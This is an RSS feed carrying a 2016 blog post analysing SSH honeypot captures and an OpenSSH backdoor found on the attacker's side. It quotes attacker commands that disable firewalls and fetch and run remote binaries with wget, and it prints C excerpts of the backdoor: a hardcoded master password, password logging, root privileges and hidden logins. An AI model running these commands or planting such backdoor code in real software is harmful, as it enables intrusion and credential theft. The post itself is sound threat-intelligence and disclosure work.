@@ -1,0 +1,307 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes" ?>
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
+  <channel>
+    <title>Linux on Te(k|ch) blog</title>
+    <link>https://www.randhome.io/categories/linux/</link>
+    <description>Recent content in Linux on Te(k|ch) blog</description>
+    <generator>Hugo -- gohugo.io</generator>
+    <language>en-us</language>
+    <lastBuildDate>Mon, 01 Aug 2016 14:53:42 +0200</lastBuildDate>
+    <atom:link href="https://www.randhome.io/categories/linux/index.xml" rel="self" type="application/rss+xml" />
+    
+    <item>
+      <title>Openssh backdoor used on compromised Linux servers</title>
+      <link>https://www.randhome.io/blog/2016/08/01/openssh-backdoor-used-on-compromised-linux-servers/</link>
+      <pubDate>Mon, 01 Aug 2016 14:53:42 +0200</pubDate>
+      
+      <guid>https://www.randhome.io/blog/2016/08/01/openssh-backdoor-used-on-compromised-linux-servers/</guid>
+      <description>
+
+&lt;p&gt;Olà,&lt;/p&gt;
+
+&lt;p&gt;Some times ago, I have installed honeypot services on one of my servers, in order to see what happens in the real outside world. I especially installed the &lt;a href=&#34;https://github.com/cowrie/cowrie&#34;&gt;cowrie&lt;/a&gt; ssh honeypot which simulate a Linux shell and gather binaries that people want to install on the server (this tool is awesome, check &lt;a href=&#34;https://github.com/micheloosterhof/cowrie/wiki/How-to-setup-Cowrie-on-Debian&#34;&gt;here&lt;/a&gt; to install it).&lt;/p&gt;
+
+
+&lt;figure &gt;
+    
+        &lt;img src=&#34;https://www.randhome.io/media/doctor8.jpg&#34; /&gt;
+    
+    
+&lt;/figure&gt;
+
+
+&lt;h2 id=&#34;cowrie-ssh&#34;&gt;Cowrie ssh&lt;/h2&gt;
+
+&lt;p&gt;This honeypot is really fun, because it records everything done during an attack, and record the whole tty session which can be replayed. If the attacker tries to download a file, cowrie automatically downloads it and stores it in a dedicated directory. In my case, I have only allowed one correct password (but an easily one : root123), so most of my logs are failed authentications:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;2015-11-10 08:43:04+0100 [SSHService ssh-userauth on HoneyPotTransport,17996,177.124.226.37] login attempt [bayvit/bayvit] failed
+2015-11-10 08:44:42+0100 [SSHService ssh-userauth on HoneyPotTransport,17997,177.124.226.37] login attempt [explore/explore] failed
+2015-11-10 08:45:11+0100 [SSHService ssh-userauth on HoneyPotTransport,17998,106.186.116.239] login attempt [jonathan/111111] failed
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Here is a short top 20 of most used users and passwords :&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;Top 20 users&lt;/strong&gt;&lt;/p&gt;
+
+&lt;ul&gt;
+&lt;li&gt;root&lt;/li&gt;
+&lt;li&gt;admin&lt;/li&gt;
+&lt;li&gt;test&lt;/li&gt;
+&lt;li&gt;user&lt;/li&gt;
+&lt;li&gt;oracle&lt;/li&gt;
+&lt;li&gt;postgres&lt;/li&gt;
+&lt;li&gt;guest&lt;/li&gt;
+&lt;li&gt;ubnt&lt;/li&gt;
+&lt;li&gt;git&lt;/li&gt;
+&lt;li&gt;nagios&lt;/li&gt;
+&lt;li&gt;ftpuser&lt;/li&gt;
+&lt;li&gt;ubuntu&lt;/li&gt;
+&lt;li&gt;tomcat&lt;/li&gt;
+&lt;li&gt;pi&lt;/li&gt;
+&lt;li&gt;support&lt;/li&gt;
+&lt;li&gt;(empty user)&lt;/li&gt;
+&lt;li&gt;ftp&lt;/li&gt;
+&lt;li&gt;teamspeak&lt;/li&gt;
+&lt;li&gt;mysql&lt;/li&gt;
+&lt;li&gt;bin&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;&lt;strong&gt;Top 20 passwords&lt;/strong&gt;&lt;/p&gt;
+
+&lt;ul&gt;
+&lt;li&gt;123456&lt;/li&gt;
+&lt;li&gt;password&lt;/li&gt;
+&lt;li&gt;root123 (used regularly as accepted by cowrie)&lt;/li&gt;
+&lt;li&gt;1234&lt;/li&gt;
+&lt;li&gt;12345&lt;/li&gt;
+&lt;li&gt;admin&lt;/li&gt;
+&lt;li&gt;test&lt;/li&gt;
+&lt;li&gt;root&lt;/li&gt;
+&lt;li&gt;123&lt;/li&gt;
+&lt;li&gt;(empty password)&lt;/li&gt;
+&lt;li&gt;1&lt;/li&gt;
+&lt;li&gt;p@ssw0rd&lt;/li&gt;
+&lt;li&gt;!@&lt;/li&gt;
+&lt;li&gt;wubao&lt;/li&gt;
+&lt;li&gt;jiamima&lt;/li&gt;
+&lt;li&gt;!q@w&lt;/li&gt;
+&lt;li&gt;!&lt;/li&gt;
+&lt;li&gt;!qaz@wsx&lt;/li&gt;
+&lt;li&gt;qwerty&lt;/li&gt;
+&lt;li&gt;user&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;Successfull attacks often juste download a malicious script/binary and execute it:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;HoneyPotTransport,110774,121.12.173.62] CMD: /etc/init.d/iptables stop;service iptables stop;SuSEfirewall2 stop;reSuSEfirewall2 stop;wget -c http://222.186.56.5:88/China1991;chmod 755 China1991;./China1991;
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;h2 id=&#34;what-are-those-files&#34;&gt;What are those files?!?&lt;/h2&gt;
+
+&lt;p&gt;Among the files downloaded by Cowrie, I noticed an important number of text files, which is weird as I was thinking of finding only perl scripts / malicious ELF files. I finally found the logs related to these files:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;2016-01-21 19:37:19+0100 [SSHService ssh-userauth on HoneyPotTransport,111016,37.228.227.119] login attempt [root/root123] succeeded
+2016-01-21 19:37:20+0100 [SSHService ssh-userauth on HoneyPotTransport,111016,37.228.227.119] root authenticated with keyboard-interactive
+2016-01-21 19:37:20+0100 [SSHService ssh-userauth on HoneyPotTransport,111016,37.228.227.119] starting service ssh-connection
+2016-01-21 19:37:20+0100 [SSHService ssh-connection on HoneyPotTransport,111016, 37.228.227.119] got channel session request
+2016-01-21 19:37:20+0100 [SSHChannel session (0) on SSHService ssh-connection on HoneyPotTransport,111016,37.228.227.119] channel open
+2016-01-21 19:37:20+0100 [SSHChannel session (0) on SSHService ssh-connection on HoneyPotTransport,111016,37.228.227.119] pty request: xterm (24, 80, 0, 0)
+[SNIP]
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;The cowrie log is pretty long because&amp;hellip; it was a manual attack (whut?). So you have many failed commands (cowrie doesn&amp;rsquo;t implement all the shell commands), and in the end the interesting one:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;unset HISTFILE
+unset HISTSAVE
+unset SAVEFILE
+unset ********
+history -n
+unset WATCH
+export HISTFILE=/dev/null
+w
+sshd
+uname -a
+ps x
+cat /etc/hosts
+/sbin/ifconfig -a |grep inet | wc -l
+ls -la
+wget http://fm.fo/images/cette.jpg; tar zxvf cette.jpg; rm -rf cette*; cd ssh
+ls -la
+cd ..
+rm -rf ssh
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Here the attacker doesn&amp;rsquo;t understand what is happening because cowrie simulates the wget commands but the tar command fails (likely a cowrie bug when implementing the command). So the attacker will try many different ways to untar the file, and finally reboot the server.&lt;/p&gt;
+
+&lt;p&gt;Once extracted, the archive is composed of the source code of openssh 4.3 (I have uploaded all the code on &lt;a href=&#34;https://github.com/Te-k/openssh-backdoor&#34;&gt;github&lt;/a&gt; if you want to check by yourself)&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;&amp;gt; cat v
+OpenSSH_4.3p2, OpenSSL 0.9.8b 04 May 2006
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;There is still one weird thing : what is this &lt;em&gt;backdoor.h&lt;/em&gt; file ?&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-C&#34;&gt;/* backdoor stuff */
+#define BACKDOORPASSWD &amp;quot;SSHD_PASS&amp;quot;
+#define LOGGING_PASSWORDS 1
+#define PASSWORDS_LOG_FILE &amp;quot;LOG_PATH&amp;quot;
+
+int backdoor_active;
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;The BACKDOORPASSWD macro is used in the file &lt;em&gt;auth-passwd.c&lt;/em&gt;, in the auth_password function in charge of checking the users password:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-C&#34;&gt;    backdoor_active = 0;
+    if(strcmp(password, BACKDOORPASSWD) == 0)
+    {
+        backdoor_active = 1;
+        return 1;
+    }
+    else
+    {
+    [LEGITIMATE CODE]
+    [...]
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Strangely, this backdoor also implements a logging functionnality both in &lt;em&gt;sshconnect1.c&lt;/em&gt; and &lt;em&gt;sshconnect2.c&lt;/em&gt;:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-C&#34;&gt;    if((strcmp(BACKDOORPASSWD,password) != 0) &amp;amp;&amp;amp; LOGGING_PASSWORDS)
+      {
+        FILE *fp = fopen(PASSWORDS_LOG_FILE,&amp;quot;a&amp;quot;);
+        fprintf (fp,&amp;quot;+host: %s +user: %s +password: %s\n&amp;quot;, get_remote_ipaddr(), options.user, password);
+        fclose (fp)
+      }
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;In &lt;em&gt;session.c&lt;/em&gt;, the backdoor disable the hist file and force the suid to 0 (root):&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-C&#34;&gt;     if(backdoor_active)
+        child_set_env(&amp;amp;env, &amp;amp;envsize, &amp;quot;HISTFILE&amp;quot;, &amp;quot;/dev/null&amp;quot;);
+
+    [...]
+
+    if(!backdoor_active)
+      {
+        [SNIP]
+      }
+    else
+      {
+        setgid(0);
+        initgroups(pw-&amp;gt;pw_name, 0);
+      }
+
+    [...]
+    if(!backdoor_active)
+        permanently_set_uid(pw);
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;And finally in &lt;em&gt;sshlogin.c&lt;/em&gt;, it disable logging of connections using the backdoor password:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-C&#34;&gt;/*
+* Records that the user has logged in.  I these parts of operating systems
+* were more standardized.
+*/
+void
+record_login(pid_t pid, const char *ttyname, const char *user, uid_t uid,
+    const char *host, struct sockaddr * addr, socklen_t addrlen)
+{
+  if(!backdoor_active)
+      {
+        struct logininfo *li;
+
+        li = login_alloc_entry(pid, user, host, ttyname);
+        login_set_addr(li, addr, addrlen);
+        login_login(li);
+        login_free_entry(li);
+      }
+    }
+}
+#ifdef LOGIN_NEEDS_UTMPX
+void
+record_utmp_only(pid_t pid, const char *ttyname, const char *user,
+                 const char *host, struct sockaddr * addr, socklen_t addrlen)
+{
+  if(!backdoor_active)
+    {
+  struct logininfo *li;
+
+  li = login_alloc_entry(pid, user, host, ttyname);
+  login_set_addr(li, addr, addrlen);
+  login_utmp_only(li);
+  login_free_entry(li);
+}}
+#endif
+
+/* Records that the user has logged out. */
+void
+record_logout(pid_t pid, const char *ttyname, const char *user)
+{
+  if(!backdoor_active)
+    {
+  struct logininfo *li;
+
+  li = login_alloc_entry(pid, user, NULL, ttyname);
+  login_logout(li);
+  login_free_entry(li);
+}
+}
+
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;All these modifications are in the &lt;a href=&#34;https://github.com/Te-k/openssh-backdoor/blob/master/openssh-3.6.1p2-backdoor.patch&#34;&gt;openssh-3.6.1p2-backdoor.patch&lt;/a&gt; included in the code.&lt;/p&gt;
+
+&lt;h2 id=&#34;lets-do-threat-intelligence&#34;&gt;Lets do Threat Intelligence&lt;/h2&gt;
+
+&lt;p&gt;So let&amp;rsquo;s try to understand what happened : a successful authentication happened the 21/01/16 from 37.228.227.119 (weirdly from source port 34, the client is putty). The first connection is directly successful (no bruteforce before).&lt;/p&gt;
+
+&lt;p&gt;This IP address belongs to UPC Ireland, which seems to be a Telecom provider now called Virgin media (I informed them of this attack on their abuse email address).&lt;/p&gt;
+
+&lt;p&gt;I have learnt recently that the &lt;a href=&#34;https://www.dshield.org/&#34;&gt;SANS Dshield Group&lt;/a&gt; collects SSH logs from kippo/cowrie ssh honeypots. You can easily send your cowrie log by using the cowrie dshield output plugin (there is also a script called &lt;a href=&#34;https://github.com/jkakavas/kippo-pyshield&#34;&gt;kippo-pyshield&lt;/a&gt; to do this).&lt;/p&gt;
+
+&lt;p&gt;Let&amp;rsquo;s check what we can learn about the IP from the &lt;a href=&#34;https://dshield.org/api/&#34;&gt;Dshield API&lt;/a&gt;, you just have to visit &lt;a href=&#34;https://isc.sans.edu/api/ip/37.228.227.119&#34;&gt;https://isc.sans.edu/api/ip/37.228.227.119&lt;/a&gt; (?json or ?text can be added to change the format):&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;&amp;lt;ip&amp;gt;
+    &amp;lt;number&amp;gt;37.228.227.119&amp;lt;/number&amp;gt;
+    &amp;lt;count/&amp;gt;
+    &amp;lt;attacks/&amp;gt;
+    &amp;lt;maxdate/&amp;gt;
+    &amp;lt;mindate/&amp;gt;
+    &amp;lt;updated/&amp;gt;
+    &amp;lt;comment/&amp;gt;
+    &amp;lt;maxrisk/&amp;gt;
+    &amp;lt;asabusecontact&amp;gt;noc@libertyglobal.com&amp;lt;/asabusecontact&amp;gt;
+    &amp;lt;as&amp;gt;6830&amp;lt;/as&amp;gt;
+    &amp;lt;asname&amp;gt;
+	&amp;lt;![CDATA[
+	    LGI-UPC formerly known as UPC Broadband Holding B.V.,
+	]]&amp;gt;
+    &amp;lt;/asname&amp;gt;
+    &amp;lt;ascountry&amp;gt;AT&amp;lt;/ascountry&amp;gt;
+    &amp;lt;assize&amp;gt;8576685&amp;lt;/assize&amp;gt;
+    &amp;lt;network&amp;gt;37.228.224.0/19&amp;lt;/network&amp;gt;
+&amp;lt;/ip&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;So Dshield knows nothing about this address, which was likely not used for any ssh bruteforce attack.  My best guess is that automated tools were used to bruteforce the server and find the password (hard to find which one). Once identified, the user connected to the server using his local computer (putty under Windows) and from his own ISP (and this is pretty stupid thing to do).&lt;/p&gt;
+
+&lt;p&gt;The malicious code is hosted on the domain fm.fo (hxxp://fm/fo/images/cette.jpg exactly) which host a website of an icelandinc cleaning company (if I guess well, icelandic is really badly translated by Google). This website was likely compromised to host the malicious code but it is weird because it doesn&amp;rsquo;t use any common framework (I contacted the owner, no answer yet).&lt;/p&gt;
+
+&lt;h2 id=&#34;iocs&#34;&gt;IOCs&lt;/h2&gt;
+
+&lt;p&gt;It&amp;rsquo;s not the new super-duper fancy APT group attack, but I like how &lt;a href=&#34;https://twitter.com/malware_traffic&#34;&gt;Brad&lt;/a&gt; ends &lt;a href=&#34;http://www.malware-traffic-analysis.net/&#34;&gt;his posts&lt;/a&gt; with a summary of what to check on your system, so here is a short summary:&lt;/p&gt;
+
+&lt;ul&gt;
+&lt;li&gt;Bruteforce IP : 37.228.227.119&lt;/li&gt;
+&lt;li&gt;URL of the malicious code : hxxp://fm.fo/images/cette.jpg (still available when writing the article, IP resolved is 77.243.43.9 in Denmark)&lt;/li&gt;
+&lt;li&gt;SSH backdoor password : SSHD_PASS&lt;/li&gt;
+&lt;li&gt;File created by the backdoor : LOG_PATH&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;I&amp;rsquo;m still on &lt;a href=&#34;https://twitter.com/tenacioustek&#34;&gt;Twitter&lt;/a&gt; if you have any comment.&lt;/p&gt;
+
+&lt;p&gt;Ciao&lt;/p&gt;
+</description>
+    </item>
+    
+  </channel>
+</rss>
